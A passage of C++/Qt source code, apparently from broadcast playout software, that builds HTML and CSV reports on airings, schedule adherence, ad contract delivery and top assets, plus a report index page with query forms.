    b += h2("Upcoming placements", "next 7 days of the effective schedule");
    const QJsonArray up = d.value("upcoming").toArray();
    if (up.isEmpty()) b += none("not scheduled in the next 7 days (and no query block it is eligible for)");
    else {
        QString tb; for (const auto& v : up) { const QJsonObject u = v.toObject(); const QString flag = u.value("hardStart").toBool() ? QStringLiteral("hard start") : (u.value("locked").toBool() ? QStringLiteral("locked") : QString());
            tb += QString("<tr><td class='t'>%1</td><td>%2</td><td class='mono'>%3</td><td>%4</td><td>%5</td><td class='t n'>%6</td><td>%7</td></tr>").arg(esc(u.value("at").toString()), esc(u.value("channel").toString()), esc(u.value("slotId").toString()) + (u.value("override").toBool() ? QStringLiteral(" (override)") : QString()), esc(u.value("title").toString()), pill(u.value("how").toString()), hms(u.value("durationSec").toDouble()), flag); }
        b += "<table class='plain'>" + thead({ "When", "Channel", "Slot", "Title", "How", "#Duration", "" }) + "<tbody>" + tb + "</tbody></table>";
    }
    return b;
}

QString ReportBuilder::htmlAssets(const QJsonObject& d) const {
    const QJsonObject s = d.value("summary").toObject();
    QString b = "<div class='cards'>" + card("Assets", QString::number(s.value("assets").toInt()), QString("%1 aired · %2 never aired").arg(s.value("airedAssets").toInt()).arg(s.value("neverAired").toInt())) + card("Airings", QString::number(s.value("airings").toInt())) + card("Total airtime", hms(s.value("airtimeSec").toDouble()))
        + card("On-time", s.value("onTimePct").isNull() ? "—" : num(s.value("onTimePct").toDouble(), 0) + "%") + card("Channels", jsStr(s.value("channels")).isEmpty() ? "—" : jsStr(s.value("channels"))) + card("Orphans", QString::number(s.value("orphans").toInt()), "aired but not in library") + "</div>" + truncNote(d);
    const QJsonArray assets = d.value("assets").toArray();
    if (assets.isEmpty()) b += none("no assets matched");
    for (const auto& v : assets) {
        const QJsonObject a = v.toObject(), m = a.value("media").toObject();
        QStringList meta; for (const QString& k : { "type", "category", "subcategory", "series", "client" }) if (!m.value(k).toString().isEmpty()) meta << m.value(k).toString();
        const QString stat = QString("%1 airing(s) · %2 airtime · %3 on-time · %4 late · %5 skipped/failed · %6 lifetime plays").arg(a.value("airings").toInt()).arg(hms(a.value("airtimeSec").toDouble())).arg(a.value("onTimePct").isNull() ? QStringLiteral("—") : num(a.value("onTimePct").toDouble(), 0) + "%").arg(a.value("late").toInt()).arg(a.value("skipped").toInt() + a.value("failed").toInt()).arg(m.value("playCount").toInt());
        b += "<div class='asset'><div class='hd'>" + thumbImg(m.value("thumbnail").toString().isEmpty() ? QString() : m.value("id").toString(), 34) + "<span class='ti'><a href='/reports/asset/" + esc(QString::fromUtf8(QUrl::toPercentEncoding(m.value("id").toString()))) + ".html'>" + esc(m.value("title").toString()) + "</a></span><span class='meta'>" + esc(meta.join(" · ")) + "</span>"
            + (a.value("neverAired").toBool() ? pill("never aired") : (a.value("noAiringsInWindow").toBool() ? pill("not in window") : QString())) + "<span class='stat'>" + esc(stat) + "</span></div>";
        const QJsonArray rows = a.value("rows").toArray();
        if (rows.isEmpty()) b += none("no airings in this window");
        else { QString tb; for (int i = rows.size() - 1; i >= 0; --i) tb += airingRow(rows[i].toObject(), true, false); if (a.value("hiddenRows").toInt() > 0) tb += QString("<tr><td colspan='9' class='none'>+ %1 more airings not shown</td></tr>").arg(a.value("hiddenRows").toInt());
            b += "<table>" + thead(airingCols(true, false)) + "<tbody>" + tb + "</tbody></table>"; }
        b += "</div>";
    }
    const QJsonArray orphans = d.value("orphans").toArray();
    if (!orphans.isEmpty()) {
        b += h2("Aired but not in the library") + "<p class='note'>as-run rows whose asset id no longer resolves to a media record (deleted or re-ingested assets)</p>";
        QString tb; int i = 0; for (const auto& v : orphans) { const QJsonObject o = v.toObject(); tb += QString("<tr><td class='rk'>%1</td><td>%2</td><td class='mono'>%3</td><td class='n'>%4</td><td class='n t'>%5</td><td class='t'>%6</td><td>%7</td></tr>").arg(++i).arg(esc(o.value("name").toString()), esc(o.value("key").toString())).arg(o.value("airings").toInt()).arg(hms(o.value("airtimeSec").toDouble()), esc(o.value("lastAired").toString()), esc(jsStr(o.value("channels")))); }
        b += "<table class='plain'>" + thead({ "", "Title", "Asset id", "#Airings", "#Airtime", "Last aired", "Channels" }) + "<tbody>" + tb + "</tbody></table>";
    }
    return b;
}

QString ReportBuilder::htmlFull(const QJsonObject& d) const {
    const QJsonObject t = d.value("totals").toObject();
    QString b = "<div class='cards'>" + card("Airings", QString::number(t.value("airings").toInt())) + card("Total airtime", hms(t.value("airtimeSec").toDouble())) + card("Unique assets", QString::number(t.value("uniqueAssets").toInt()))
        + card("On-time", t.value("onTimePct").isNull() ? "—" : num(t.value("onTimePct").toDouble(), 0) + "%", QString("%1 scheduled").arg(t.value("scheduled").toInt())) + card("Fill share", num(t.value("fillPct").toDouble()) + "%", hms(t.value("fillSec").toDouble()))
        + card("Failures", QString::number(t.value("failures").toInt()), "failed + skipped") + card("Scope", d.value("channelName").toString()) + "</div>" + truncNote(d);
    b += "<div class='exec'>" + h2("Executive summary") + "<p>" + esc(d.value("narrative").toString()) + "</p></div>";
    for (const auto& v : d.value("sections").toArray()) { const QJsonObject s = v.toObject(); b += h2(s.value("title").toString()) + aggTableHtml(s.value("rows").toArray(), false); }
    if (d.value("perChannel").toArray().size() > 1 || d.value("channel").toString().isEmpty()) b += h2("Per-channel subtotals") + aggTableHtml(d.value("perChannel").toArray(), false);
    b += h2("Top 25 assets") + aggTableHtml(d.value("topAssets").toArray(), true);
    const QJsonArray f = d.value("failures").toArray();
    b += h2("Failures and skips", QString("%1 in period%2").arg(t.value("failures").toInt()).arg(f.size() < t.value("failures").toInt() ? QString(", first %1 shown").arg(f.size()) : QString()));
    if (f.isEmpty()) b += none("none");
    else { QString tb; for (const auto& v : f) { const QJsonObject r = v.toObject(); tb += QString("<tr><td>%1</td><td class='t'>%2</td><td>%3</td><td>%4</td><td>%5</td><td>%6</td></tr>").arg(esc(r.value("channel").toString()), esc(r.value("actual").toString() == "—" ? r.value("planned").toString() : r.value("actual").toString()), pill(r.value("disp").toString()), esc(r.value("title").toString()), esc(r.value("type").toString()), esc(r.value("reason").toString())); }
        b += "<table class='plain'>" + thead({ "Channel", "Time", "Status", "Title", "Type", "Reason" }) + "<tbody>" + tb + "</tbody></table>"; }
    return b;
}

QString ReportBuilder::htmlAdherence(const QJsonObject& d) const {
    const QJsonObject c = d.value("counts").toObject();
    QString b = "<div class='cards'>" + card("Score", d.value("scorePct").isNull() ? "—" : num(d.value("scorePct").toDouble(), 0) + "%", "on-time ÷ planned") + card("Planned", QString::number(d.value("planned").toInt())) + card("Aired", QString::number(d.value("aired").toInt()))
        + card("On-time", QString::number(c.value("onTime").toInt())) + card("Late", QString::number(c.value("late").toInt())) + card("Early", QString::number(c.value("early").toInt())) + card("Missed", QString::number(c.value("missed").toInt()))
        + (c.value("pending").toInt() > 0 ? card("Pending", QString::number(c.value("pending").toInt()), "not due yet") : QString()) + card("Unscheduled", QString::number(c.value("unscheduled").toInt())) + "</div>";
    b += h2("Hour by hour");
    { QString tb; for (const auto& v : d.value("hours").toArray()) { const QJsonObject h = v.toObject(); if (h.value("planned").toInt() == 0 && h.value("aired").toInt() == 0 && h.value("pending").toInt() == 0) continue;
        tb += QString("<tr><td class='t'><a class='q' href='#ah-%1'>%2</a></td><td>%3</td><td class='n'>%4</td><td class='n'>%5</td><td class='n'>%6</td><td class='n'>%7</td><td class='n'>%8</td><td class='n'>%9</td><td class='n'>%10</td><td class='n'>%11</td><td>%12</td></tr>").arg(h.value("hour").toInt()).arg(esc(h.value("label").toString()), esc(h.value("blockType").toString())).arg(h.value("planned").toInt()).arg(h.value("aired").toInt()).arg(h.value("onTime").toInt()).arg(h.value("late").toInt()).arg(h.value("early").toInt()).arg(h.value("missed").toInt()).arg(h.value("pending").toInt()).arg(h.value("unscheduled").toInt()).arg(h.value("scorePct").isNull() ? QStringLiteral("—") : progressBar(h.value("scorePct").toDouble())); }
      b += tb.isEmpty() ? none("nothing scheduled or aired on this day") : "<table class='plain'>" + thead({ "Hour", "Block", "#Planned", "#Aired", "#On-time", "#Late", "#Early", "#Missed", "#Pending", "#Unsched.", "Score" }) + "<tbody>" + tb + "</tbody></table>"; }
    const QJsonArray worst = d.value("worst").toArray();
    if (!worst.isEmpty()) { b += h2("Worst offenders") + "<ul class='bl warn'>"; for (const auto& v : worst) { const QJsonObject w = v.toObject(); b += QString("<li>%1 — “%2” planned %3, aired %4 (%5)</li>").arg(esc(w.value("status").toString()), esc(w.value("title").toString()), esc(w.value("planned").toString()), esc(w.value("actual").toString()), signedSec(w.value("deltaSec").toDouble())); } b += "</ul>"; }
    b += h2("Scheduled items");
    const QJsonArray items = d.value("items").toArray();
    if (items.isEmpty()) b += none("nothing scheduled");
    else { QString tb; int cur = -1; for (const auto& v : items) { const QJsonObject it = v.toObject(); const int h = it.value("hour").toInt();
        if (h != cur) { cur = h; tb += QString("<tr class='hr' id='ah-%1'><td colspan='8'>%2:00</td></tr>").arg(h).arg(h, 2, 10, QChar('0')); }
        const int picks = it.value("pickCount").toInt();
        const QString flag = it.value("lateBound").toBool() ? " <span class='pill uns'>block" + (picks > 0 ? QString(" · %1 aired").arg(picks) : QString()) + "</span>" : (it.value("hardStart").toBool() ? QStringLiteral(" <span class='pill uns'>hard</span>") : QString());
        tb += QString("<tr><td class='t'>%1</td><td>%2%3</td><td>%4</td><td>%5</td><td class='t'>%6</td>%7<td class='t n'>%8</td><td>%9</td></tr>").arg(esc(it.value("planned").toString()), esc(it.value("title").toString()), flag, esc(it.value("type").toString()), pill(it.value("status").toString()), esc(it.value("actual").toString().isEmpty() ? QStringLiteral("—") : it.value("actual").toString()), deltaCell(it.value("deltaSec")), hms(it.value("durationSec").toDouble()), esc(it.value("matchedBy").toString())); }
        b += "<table class='plain'>" + thead({ "Planned", "Title", "Type", "Status", "Actual", "#Δ", "#Duration", "Matched by" }) + "<tbody>" + tb + "</tbody></table>"; }
    const QJsonArray uns = d.value("unscheduled").toArray();
    if (!uns.isEmpty()) { QString tb; for (const auto& v : uns) { const QJsonObject u = v.toObject(); tb += QString("<tr><td class='t'>%1</td><td>%2</td><td>%3</td><td>%4</td><td>%5</td><td class='t n'>%6</td></tr>").arg(esc(u.value("actual").toString()), esc(u.value("title").toString()), esc(u.value("type").toString()), esc(u.value("origin").toString()), pill(u.value("disp").toString()), hms(u.value("durationSec").toDouble())); }
        b += h2("Unscheduled airings") + "<p class='note'>fill, emergency, manual and other starts with no matching planned item</p><table class='plain'>" + thead({ "Actual", "Title", "Type", "Origin", "Status", "#Duration" }) + "<tbody>" + tb + "</tbody></table>"; }
    return b;
}

QString ReportBuilder::htmlContracts(const QJsonObject& d) const {
    const QJsonObject s = d.value("summary").toObject();
    QString b = "<div class='cards'>" + card("Contracts", QString::number(s.value("contracts").toInt())) + card("On pace", QString::number(s.value("onPace").toInt())) + card("Behind", QString::number(s.value("behind").toInt())) + card("Complete", QString::number(s.value("complete").toInt()))
        + (s.value("inactive").toInt() > 0 ? card("Paused / done", QString::number(s.value("inactive").toInt()), "not paced") : QString()) + (s.value("noTarget").toInt() > 0 ? card("No target", QString::number(s.value("noTarget").toInt()), "no spots total / per day") : QString())
        + card("Spots delivered", QString("%1 / %2").arg(s.value("aired").toInt()).arg(s.value("target").toInt()), "active contracts") + "</div>" + truncNote(d);
    const QJsonArray cs = d.value("contracts").toArray();
    if (cs.isEmpty()) return b + none(d.value("configured").toInt() == 0 ? "no contracts configured (settings key traffic.contracts)" : "no contract matched");
    for (const auto& v : cs) {
        const QJsonObject c = v.toObject();
        // heading: client and campaign title (a blank client falls back to the title, then to the id); `campaign` is the pre-AdContract spelling of `title`
        const QString client = c.value("client").toString(), title = c.value("title").toString().isEmpty() ? c.value("campaign").toString() : c.value("title").toString();
        const QString head = client.isEmpty() ? esc(title.isEmpty() ? c.value("id").toString() : title) : esc(client) + (title.isEmpty() ? QString() : " — " + esc(title));
        QStringList chList; for (const auto& ch : c.value("channels").toArray()) chList << ch.toString();
        const QString meta = QString("%1 → %2%3 · %4 · %5 day(s), %6 elapsed · id %7").arg(c.value("startDate").toString(), c.value("endDate").toString(), c.value("openEnd").toBool() ? " (open end)" : QString(), chList.isEmpty() ? QStringLiteral("all channels") : chList.join(", ")).arg(c.value("totalDays").toInt()).arg(c.value("elapsedDays").toInt()).arg(c.value("id").toString());
        b += "<div class='asset'><div class='hd'><span class='ti'>" + head + "</span><span class='meta'>" + esc(meta) + "</span>" + pill(c.value("status").toString()) + "<span class='stat'>" + QString("%1 / %2 spots · expected %3 to date · pacing %4 · projected %5 · shortfall %6").arg(c.value("aired").toInt()).arg(c.value("target").toInt()).arg(num(c.value("expectedToDate").toDouble(), 0)).arg(num(c.value("pacingPct").toDouble(), 0) + "%").arg(c.value("projected").toInt()).arg(c.value("shortfall").toInt()) + "</span></div>";
        b += "<div style='padding:10px 16px;display:flex;gap:24px;flex-wrap:wrap;align-items:center;font-size:13px'><span>Delivery " + (c.value("deliveryPct").isNull() ? QStringLiteral("—") : progressBar(c.value("deliveryPct").toDouble())) + "</span><span>Pacing " + progressBar(c.value("pacingPct").toDouble(), c.value("pacingPct").toDouble() >= 95 ? "#15803d" : "#b45309") + "</span></div>";
        const QJsonArray days = c.value("perDay").toArray();
        if (!days.isEmpty() && days.size() <= 93) b += "<div style='padding:0 16px 10px'>" + barChart(days, "label", "spots", "{label}: {value} spots", 70) + "</div>";
        QString tb; for (const auto& mv : c.value("media").toArray()) { const QJsonObject m = mv.toObject(); tb += QString("<tr><td>%1</td><td class='mono'>%2</td><td class='t n'>%3</td><td class='n'>%4</td></tr>").arg(m.value("inLibrary").toBool() ? "<a class='q' href='/reports/asset/" + esc(QString::fromUtf8(QUrl::toPercentEncoding(m.value("id").toString()))) + ".html'>" + esc(m.value("title").toString()) + "</a>" : esc(m.value("title").toString()) + " " + pill("orphan"), esc(m.value("id").toString()), hms(m.value("durationSec").toDouble())).arg(m.value("aired").toInt()); }
        b += tb.isEmpty() ? none("no media ids on this contract") : "<table>" + thead({ "Spot", "Asset id", "#Duration", "#Aired" }) + "<tbody>" + tb + "</tbody></table>";
        b += "</div>";
    }
    return b;
}

QString ReportBuilder::htmlTop(const QJsonObject& d) const {
    QString b = "<div class='cards'>" + card("Airings", QString::number(d.value("airings").toInt())) + card("Airtime", hms(d.value("airtimeSec").toDouble())) + card("Unique assets", QString::number(d.value("uniqueAssets").toInt())) + card("Window", QString("%1 days").arg(d.value("days").toInt())) + "</div>" + truncNote(d);
    const QJsonArray rows = d.value("rows").toArray();
    if (rows.isEmpty()) return b + none("no airings in this window");
    QString tb; for (const auto& v : rows) { const QJsonObject r = v.toObject(); const QString id = r.value("assetId").toString();
        tb += QString("<tr><td class='rk'>%1</td><td>%2</td><td>%3</td><td>%4</td><td class='n'>%5</td><td class='n t'>%6</td><td class='n'>%7</td><td class='n'>%8</td><td class='t'>%9</td><td>%10</td></tr>").arg(r.value("rank").toInt()).arg(id.isEmpty() ? esc(r.value("name").toString()) : "<a class='q' href='/reports/asset/" + esc(QString::fromUtf8(QUrl::toPercentEncoding(id))) + ".html'>" + esc(r.value("name").toString()) + "</a>" + (r.value("inLibrary").toBool() ? QString() : " " + pill("orphan")), esc(r.value("type").toString()), esc(r.value("client").toString().isEmpty() ? r.value("series").toString() : r.value("client").toString())).arg(r.value("airings").toInt()).arg(hms(r.value("airtimeSec").toDouble()), num(r.value("sharePct").toDouble()) + "%", r.value("onTimePct").isNull() ? QStringLiteral("—") : num(r.value("onTimePct").toDouble(), 0) + "%", esc(r.value("lastAired").toString()), esc(jsStr(r.value("channels")))); }
    return b + "<table class='plain'>" + thead({ "", "Asset", "Type", "Client / series", "#Airings", "#Airtime", "#Share", "#On-time", "Last aired", "Channels" }) + "<tbody>" + tb + "</tbody></table>";
}

QString ReportBuilder::htmlCompare(const QJsonObject& d) const {
    const QJsonArray assets = d.value("assets").toArray(), days = d.value("daysTable").toArray();
    QString b = "<div class='cards'>";
    for (const auto& v : assets) { const QJsonObject a = v.toObject(); b += card(a.value("title").toString(), QString::number(a.value("airings").toInt()), QString("%1 · %2 / day").arg(hms(a.value("airtimeSec").toDouble()), num(a.value("perDay").toDouble(), 2))); }
    b += "</div>" + truncNote(d);
    QStringList cols{ "Date" }; for (const auto& v : assets) cols << "#" + v.toObject().value("title").toString(); cols << "#Total";
    QString tb; for (int i = days.size() - 1; i >= 0; --i) { const QJsonObject r = days[i].toObject(); tb += "<tr><td class='t'>" + esc(r.value("date").toString()) + "</td>"; for (const auto& c : r.value("counts").toArray()) tb += QString("<td class='n'>%1</td>").arg(c.toInt() ? QString::number(c.toInt()) : QStringLiteral("·")); tb += QString("<td class='n'><b>%1</b></td></tr>").arg(r.value("total").toInt()); }
    QString tot = "<tr class='hr'><td>Total</td>"; int all = 0; for (const auto& v : assets) { tot += QString("<td class='n'>%1</td>").arg(v.toObject().value("airings").toInt()); all += v.toObject().value("airings").toInt(); } tot += QString("<td class='n'>%1</td></tr>").arg(all);
    return b + h2("Airings per day") + "<table class='plain'>" + thead(cols) + "<tbody>" + tot + tb + "</tbody></table>";
}

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------
QByteArray ReportBuilder::csv(const QString& name, const QJsonObject& d) const {
    QList<QStringList> rows;
    if (d.contains("error")) return csvDoc({ "error" }, { { d.value("error").toString() } });
    auto airing = [](const QJsonObject& r, bool withAsset, const QString& asset = QString(), const QString& assetId = QString()) {
        QStringList l; if (withAsset) l << asset << assetId;
        l << r.value("channel").toString() << r.value("date").toString() << r.value("planned").toString() << r.value("actual").toString() << jsStr(r.value("varianceSec")) << r.value("event").toString() << r.value("disp").toString() << r.value("title").toString() << r.value("type").toString() << r.value("origin").toString() << jsStr(r.value("durationSec"));
        if (!withAsset) l << r.value("assetId").toString(); return l; };
    if (name == "asplayed") { for (const auto& v : d.value("rows").toArray()) rows << airing(v.toObject(), false); return csvDoc({ "channel", "date", "planned", "actual", "variance_sec", "event", "status", "title", "type", "origin", "duration_sec", "asset_id" }, rows); }
    if (name == "asset") { const QJsonObject m = d.value("media").toObject(); for (const auto& dv : d.value("airingsByDay").toArray()) for (const auto& v : dv.toObject().value("rows").toArray()) rows << airing(v.toObject(), true, m.value("title").toString(), m.value("id").toString());
        return csvDoc({ "asset", "asset_id", "channel", "date", "planned", "actual", "variance_sec", "event", "status", "title", "type", "origin", "duration_sec" }, rows); }
    if (name == "assets") { for (const auto& av : d.value("assets").toArray()) { const QJsonObject a = av.toObject(), m = a.value("media").toObject(); if (a.value("rows").toArray().isEmpty()) rows << (QStringList{ m.value("title").toString(), m.value("id").toString() } << "" << "" << "" << "" << "" << "" << (a.value("neverAired").toBool() ? "never aired" : "no airings in window") << "" << "" << "" << ""); for (const auto& v : a.value("rows").toArray()) rows << airing(v.toObject(), true, m.value("title").toString(), m.value("id").toString()); }
        return csvDoc({ "asset", "asset_id", "channel", "date", "planned", "actual", "variance_sec", "event", "status", "title", "type", "origin", "duration_sec" }, rows); }
    if (name == "full") { auto agg = [&](const QString& section, const QJsonArray& a) { for (const auto& v : a) { const QJsonObject r = v.toObject(); rows << (QStringList{ section, r.value("name").toString(), jsStr(r.value("airings")), jsStr(r.value("airtimeSec")), jsStr(r.value("uniqueAssets")), num(r.value("sharePct").toDouble()), jsStr(r.value("onTimePct")), jsStr(r.value("channels")) }); } };
        for (const auto& s : d.value("sections").toArray()) agg(s.toObject().value("title").toString(), s.toObject().value("rows").toArray()); agg("Per channel", d.value("perChannel").toArray()); agg("Top assets", d.value("topAssets").toArray());
        return csvDoc({ "section", "name", "airings", "airtime_sec", "unique_assets", "share_pct", "on_time_pct", "channels" }, rows); }
    if (name == "adherence") { for (const auto& v : d.value("items").toArray()) { const QJsonObject r = v.toObject(); rows << (QStringList{ jsStr(r.value("hour")), r.value("planned").toString(), r.value("title").toString(), r.value("type").toString(), r.value("mediaId").toString(), r.value("status").toString(), r.value("actual").toString(), jsStr(r.value("deltaSec")), jsStr(r.value("durationSec")), r.value("matchedBy").toString(), r.value("lateBound").toBool() ? "yes" : "" }); }
        for (const auto& v : d.value("unscheduled").toArray()) { const QJsonObject r = v.toObject(); rows << (QStringList{ jsStr(r.value("hour")), "", r.value("title").toString(), r.value("type").toString(), r.value("assetId").toString(), "unscheduled", r.value("actual").toString(), "", jsStr(r.value("durationSec")), r.value("origin").toString(), "" }); }
        return csvDoc({ "hour", "planned", "title", "type", "media_id", "status", "actual", "delta_sec", "duration_sec", "matched_by", "late_bound" }, rows); }
    if (name == "contracts") { for (const auto& v : d.value("contracts").toArray()) { const QJsonObject c = v.toObject(); rows << (QStringList{ c.value("id").toString(), c.value("client").toString(), jsStr(c.value("channels")), c.value("startDate").toString(), c.value("endDate").toString(), jsStr(c.value("target")), jsStr(c.value("aired")), num(c.value("expectedToDate").toDouble(), 1), num(c.value("pacingPct").toDouble(), 1), jsStr(c.value("deliveryPct")), jsStr(c.value("projected")), jsStr(c.value("shortfall")), c.value("status").toString(), jsStr(c.value("mediaIds")), c.value("title").toString(), c.value("contractStatus").toString() }); }
        return csvDoc({ "id", "client", "channels", "start_date", "end_date", "target", "aired", "expected_to_date", "pacing_pct", "delivery_pct", "projected", "shortfall", "status", "media_ids", "title", "contract_status" }, rows); }
    if (name == "top") { for (const auto& v : d.value("rows").toArray()) { const QJsonObject r = v.toObject(); rows << (QStringList{ jsStr(r.value("rank")), r.value("assetId").toString(), r.value("name").toString(), r.value("type").toString(), r.value("client").toString(), r.value("series").toString(), jsStr(r.value("airings")), jsStr(r.value("airtimeSec")), num(r.value("sharePct").toDouble()), jsStr(r.value("onTimePct")), r.value("lastAired").toString(), jsStr(r.value("channels")) }); }
        return csvDoc({ "rank", "asset_id", "title", "type", "client", "series", "airings", "airtime_sec", "share_pct", "on_time_pct", "last_aired", "channels" }, rows); }
    if (name == "compare") { QStringList hdr{ "date" }; for (const auto& a : d.value("assets").toArray()) hdr << a.toObject().value("title").toString(); hdr << "total";
        for (const auto& v : d.value("daysTable").toArray()) { const QJsonObject r = v.toObject(); QStringList l{ r.value("date").toString() }; for (const auto& c : r.value("counts").toArray()) l << QString::number(c.toInt()); l << jsStr(r.value("total")); rows << l; }
        return csvDoc(hdr, rows); }
    return csvDoc({ "error" }, { { "no CSV for report " + name } });
}

// ---------------------------------------------------------------------------
// Index page
// ---------------------------------------------------------------------------
QByteArray ReportBuilder::indexHtml() const {
    const QTimeZone tz = tzFor(QString()); const QString today = isoDate(todayIn(tz));
    QString chanSel = "<select name='channel'>"; chanSel += "<option value='all'>all channels</option>";
    const QJsonArray chans = channelsJson();
    for (int i = 0; i < chans.size(); ++i) { const QJsonObject c = chans[i].toObject(); chanSel += QString("<option value='%1'%2>%3</option>").arg(esc(c.value("id").toString()), i == 0 ? QStringLiteral(" selected") : QString(), esc(c.value("name").toString().isEmpty() ? c.value("id").toString() : c.value("name").toString())); }
    chanSel += "</select>";
    auto lab = [](const QString& l, const QString& inner) { return "<label>" + esc(l) + inner + "</label>"; };
    auto fmtSel = [] { return "<select name='format'><option value='html'>HTML</option><option value='csv'>CSV</option><option value='json'>JSON</option></select>"; };
    QString b;
    b += h2("As-played log") + "<form class='rep' action='/reports/asplayed.html'><div class='d'>Every as-run event for a channel and day (or date range): planned vs actual, variance, status, hour chart. Filter by type, origin or text.</div>"
        + lab("Channel", chanSel) + lab("Date", "<input type='date' name='date' value='" + today + "'>") + lab("From", "<input type='date' name='from'>") + lab("To", "<input type='date' name='to'>") + lab("Type", "<input name='type' placeholder='ad, program…'>") + lab("Origin", "<input name='origin' placeholder='schedule, fill…'>") + lab("Search", "<input name='q'>") + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Period report") + "<form class='rep' action='/reports/full.html'><div class='d'>Daily / weekly / monthly roll-up: totals, breakdown by type, client, series or category, per-channel subtotals, top 25 assets, failures, narrative.</div>"
        + lab("Period", "<select name='period'><option value='daily'>daily</option><option value='weekly' selected>weekly</option><option value='monthly'>monthly</option><option value='quarterly'>quarterly</option><option value='custom'>custom (from/to)</option></select>") + lab("Date", "<input type='date' name='date' value='" + today + "'>") + lab("From", "<input type='date' name='from'>") + lab("To", "<input type='date' name='to'>")
        + lab("Group", "<select name='group'><option value='all'>all</option><option value='type'>type</option><option value='client'>client</option><option value='series'>series</option><option value='category'>category</option></select>") + lab("Channel", chanSel) + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Assets report") + "<form class='rep' action='/reports/assets.html'><div class='d'>One compact section per asset with every airing's exact planned and actual time; totals, never-aired flags and orphaned as-run rows. Target explicit ids or a library filter.</div>"
        + lab("Ids (comma)", "<input name='ids' style='min-width:220px'>") + lab("Search", "<input name='q'>") + lab("Type", "<input name='type'>") + lab("Category", "<input name='category'>") + lab("Client", "<input name='client'>") + lab("Channel", chanSel) + lab("Days", "<input type='number' name='days' value='30' min='1' max='366'>") + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Single asset") + "<form class='rep' onsubmit=\"location.href=ppRepUrl('/reports/asset/'+encodeURIComponent(this.id.value.trim())+'.html?days='+this.days.value+'&format='+this.format.value);return false\"><div class='d'>Media card, airings by day with links into the as-played hour, upcoming placements (direct or eligible via query block), totals by channel and daypart.</div>"
        + lab("Asset id", "<input name='id' required style='min-width:220px'>") + lab("Days", "<input type='number' name='days' value='30' min='1' max='366'>") + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Schedule adherence") + "<form class='rep' action='/reports/adherence.html'><div class='d'>As-scheduled vs as-played for one channel-day: on-time / late / early / missed / unscheduled per hour, score and worst offenders.</div>"
        + lab("Channel", QString(chanSel).replace("<option value='all'>all channels</option>", "")) + lab("Date", "<input type='date' name='date' value='" + today + "'>") + lab("Tolerance (s)", "<input type='number' name='toleranceSec' value='90' min='0'>") + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Ad contract delivery") + "<form class='rep' action='/reports/contracts.html'><div class='d'>Delivered spots vs target per contract (settings traffic.contracts): per-day counts, pacing, projected shortfall, per-spot breakdown.</div>"
        + lab("Contract id (blank = all)", "<input name='id'>") + lab("As of", "<input type='date' name='date' value='" + today + "'>") + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Top assets") + "<form class='rep' action='/reports/top.html'><div class='d'>Most-aired assets in the window with airtime share, on-time % and last airing.</div>"
        + lab("Days", "<input type='number' name='days' value='30' min='1' max='366'>") + lab("Count", "<input type='number' name='n' value='25' min='1' max='200'>") + lab("Type", "<input name='type'>") + lab("Channel", chanSel) + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += h2("Compare assets") + "<form class='rep' action='/reports/compare.html'><div class='d'>Side-by-side airings per day for up to 8 assets.</div>"
        + lab("Ids (comma)", "<input name='ids' required style='min-width:260px'>") + lab("Days", "<input type='number' name='days' value='30' min='1' max='366'>") + lab("Channel", chanSel) + lab("Format", fmtSel()) + "<button>Open</button></form>";
    b += "<p class='note'>JSON for every report: <code>/api/v1/reports/&lt;name&gt;</code> with the same parameters (or <code>?format=json</code> on any report URL here). When the station has an API token, every report URL needs <code>?token=</code> (pages opened with it keep it on their links). Add <code>?format=csv</code> to any report URL above for an Excel-ready CSV.</p>";
    return shell("Reports", QString("%1 channel(s) · %2").arg(chans.size()).arg(QString::fromUtf8(tz.id())), b, "Report index");
}
